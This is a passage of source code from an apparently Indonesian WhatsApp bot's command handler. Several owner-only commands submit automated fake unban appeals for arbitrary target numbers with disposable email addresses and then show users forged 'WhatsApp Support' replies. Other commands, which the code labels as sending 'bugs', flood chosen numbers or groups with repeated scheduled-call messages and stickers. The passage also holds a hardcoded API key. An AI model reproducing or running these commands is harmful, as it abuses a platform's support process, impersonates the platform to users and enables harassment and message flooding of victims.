form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Silakan tunggu selama 1-24 jam untuk proses buka blokir dari bot, dan harap tunggu beberapa saat untuk melihat balasan email dari WhatsApp. 🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv2': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Silakan tunggu selama 1-24 jam untuk proses buka blokir dari bot, dan harap tunggu beberapa saat untuk melihat balasan email dari WhatsApp. 🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv3': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola WhatsApp
Actualmente, algunas personas tienen muchas formas efectivas de bloquear números de usuario e informarlos sin ningún motivo, de hecho, conozco bien los términos de servicio y los cumplí, pero algunos piratas informáticos me hicieron un informe falso y mi número fue bloqueado, desbloquee el número ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Silakan tunggu selama 1-24 jam untuk proses buka blokir dari bot, dan harap tunggu beberapa saat untuk melihat balasan email dari WhatsApp. 🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv4': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good day whatsApp team. My whatApp account has been burned permanently, please i plead with you unblock it, i cannot use another number again. I don’t know why it is burned but my friends re suggesting its because i use GB whatsApp, which i didn’t know it was wrong. My number is [ ${targetnya} ]. Please whatsApp team, help me unblock my account. please i cannot use a new number as my current number is connected to slot of important things like vacancies.
Thank you`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Silakan tunggu selama 1-24 jam untuk proses buka blokir dari bot, dan harap tunggu beberapa saat untuk melihat balasan email dari WhatsApp. 🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbannedv5': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aloha WhatsApp, ua ʻaihue ʻia kaʻu helu e ka mea hacker, e ʻoluʻolu e wehe hou iā ia [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Silakan tunggu selama 1-24 jam untuk proses buka blokir dari bot, dan harap tunggu beberapa saat untuk melihat balasan email dari WhatsApp. 🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
       
case'menfes': case 'menfess': case 'confes': case 'confess' :{
    
                if (global.db.data.users[m.sender].limit < 10) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 10
    conn.menfess = conn.menfess ? conn.menfess : {}
    if (!text) m.reply( `*Cara penggunaan :*\n\n${prefix + command} nomor|nama pengirim|pesan\n\n*Note:* nama pengirim boleh nama samaran atau anonymous.\n\n*Contoh:* ${prefix + command} ${m.sender.split`@`[0]}|Anonymous|Hai.`)
    let [jid, name, pesan] = text.split('|');
    if ((!jid || !name || !pesan)) return m.reply(`*Cara penggunaan :*\n\n${prefix + command} nomor|nama pengirim|pesan\n\n*Note:* nama pengirim boleh nama samaran atau anonymous.\n\n*Contoh:* ${prefix + command} ${m.sender.split`@`[0]}|Anonymous|Hai.`)
    jid = jid.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let data = (await conn.onWhatsApp(jid))[0] || {};
    if (!data.exists) return m.reply('Nomer tidak terdaftar di whatsapp.')
    if (jid == m.sender) return m.reply('tidak bisa mengirim pesan menfess ke diri sendiri.')
    let mf = Object.values(conn.menfess).find(mf => mf.status === true)
    if (mf) return !0
    let id = + new Date
    let tek = `Hai @${data.jid.split('@')[0]}, kamu menerima pesan Menfess nih.\n\nDari: *${name}*\nPesan: \n${pesan}`.trim()
    await conn.sendText(data.jid, tek, null)
    .then(() => {
    m.reply('Berhasil mengirim pesan menfess.')
    conn.menfess[id] = {
    id,
    dari: m.sender,
    nama: name,
    penerima: data.jid,
    pesan: pesan,
    status: false
    }
    return !0
    })
    }
        reply('_🚩 10 Limit Terpakai!!..')
    break
        case "kalkulator":
         if (global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
 if (!text) return reply(`Example:
- 52+36
- 45+7
- 36×74
- 57÷5`)
let val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
  let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
  try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
  } catch (e) {
if (e == undefined) return m.reply('Isinya?')
return m.reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
  }
        reply('_🚩 1 Limit Terpakai!!..')
  break
         case 'ping': case 'botstatus': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })              
                let timestamp = speed()
                let latensi = speed() - timestamp
                let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)

                neww = performance.now()
                oldd = performance.now()
                respon = `*📶 ᴘ ɪ ɴ ɢ* 
${latensi.toFixed(4)} _s_ \n ${oldd - neww} _ms_\n\n*📡 ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*\n ${runtime(process.uptime())}

*s ᴇ ʀ ᴠ ᴇ ʀ*
*🛑 ʀᴀᴍ:* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

*ᴄ ʜ ᴀ ᴛ s*
• *${anu.length}* Group Chats
• *1* Groups Joined
• *0* Groups Left
• *0* Personal Chats
• *1* Total Chats

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

           ${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                reply(respon)
            }
            break
    case 'profil': case 'profile': {
                                    
                        let profile = db.data.users[sender]
         const owned = `${owner}@s.whatsapp.net`
const version = 2
const text12 = `*Hay selamat ${ucapanWaktu}*

▭▬▭▬▭▬▭▬▭▬▭▬▭▬
「 *Info User* 」
⭔Nama Pengguna  : *@${sender.split('@')[0]}*
⭔Premium : ${isPrem ? '✅' : '❎'}
⭔Limit : ${profile.limit}
⭔Status : Terdaftar di database ✅
▭▬▭▬▭▬▭▬▭▬▭▬▭

Terima Kasih sudah mendaftar ke dalam bot ᴘʀᴏᴊᴇᴄᴛ ʀɪᴢᴀʟ-ᴅᴇsta ❄️.

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

conn.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/77bd4ab69e006ca36edda.jpg',
sourceUrl: "https://telegra.ph/file/77bd4ab69e006ca36edda.jpg",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
    }
break
                                                                           
//=================================================
 case 'miku': {
               
    if(!text) return reply(`masukan text`)
    let api = await fetch(`https://api-kazedevid.vercel.app/ai/charaai?chara=Miku&text=${text}`)
    let json = await api.json()
    try {
    await m.reply(json)
    } catch (err) {
    m.reply(util.format(api))
    }
    }
    break
            case 'zeta': {
                           
                if (!q) return reply('Example: Apa Itu Javascript')
                let d = await fetchJson(`https://api.yanzbotz.my.id/api/ai/characterai?text=${text}&name=ryo-yamada`)                
               // await conn.sendMessage(from, {
                 //   text: d.result
                reply(d.result), { quoted: m}
            }
            break
        /* case 'ai':
        if (skizo == "YOUR_APIKEY") return m.reply('Buat dulu apikeynya sendiri di https://skizo.tech/pricing, tenang aja ada yang bayar ada yang gratis juga kok\nlalu masukin ke setting.js')
try {
if (!text) return reply(`Contoh:\n${prefix}${command} Bagaimana kabarmu hari ini?`)
let messages = [{ role: 'system', content: `` }, { role: 'user', content: text }]
let ini = (await fetch(`https://skizo.tech/api/openai?apikey=${skizo}`, { messages })).data
let hasil = `${ini.result}`
reply(hasil)
} catch (err) {
console.log(err)
reply('Terjadi Kesalahan')
}
break*/
        case 'openai': case 'ai':
         if (global.db.data.users[m.sender].limit < 5) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
if (!text) return reply (`mau nanya apa?`) 
fetch(`https://skizo.tech/api/openai?apikey=woxxzAsia&text=${text}`,)
.then((result) => result.json())
.then((x) => reply(x.result));
        reply('_🚩 5 Limit Terpakai!!.._')
break
//=================================================
case '❤️': case '😱': case '🤣': case '😂': case '😘': case '💔': case '👊': {
if (!isCreator) return m.reply('Hanya Untuk *Creator*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62345678910`)
jumlah = `${encodeURI(text)}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(from, {text: `${botname}`}, {quoted:yuk})
}
}
m.reply(`*Sukses mengirim Bug Sebanyak ${jumlah} Tolong Jeda 3 Menit Yah*`)
break
  //=================================================
  case 'creategc':
case 'creategroup':
        {
        return reply(mess.error)
          if (!isCreator) return reply(mess.botowner);
          if (!args.join(' '))
            return reply(`Gunakan ${prefix + command} groupname`);
          try {
            let cret = await conn.groupCreate(args.join(' '), []);
            let response = await conn.groupInviteCode(cret.id);
            teks = `
༒ *GROUP CREATE* ༒

☤ Nama: ${cret.subject}
☤ Owner: @${cret.owner.split('@')[0]}

https://chat.whatsapp.com/${response}
       `;
            conn.sendMessage(
              m.chat,
              {
                text: teks,
                mentions: await conn.parseMention(teks),
              },
              { quoted: m }
            );
          } catch {
            reply('Gagal ❎');
          }
        }
        break
  //=========\\
case 'docugc': {
if (!isCreator) return m.reply('*khusus Premium*')
if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62345678910`)
await loading()
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(bnnd, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//

//=================================================//
case 'gasfullgc' : {
 if (!isCreator) return reply(mess.owner)
 await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await conn.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
// BUG OWNER
 case 'santetgc' : {
 if (!isCreator) return reply(mess.owner)
 await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await conn.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
conn.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break

case 'santet':
{
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await loading()
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu }, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })

await sleep(5000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
await sleep(2000)
conn.sendMessage(Pe, { sticker : smenu}, { quoted:yuk })
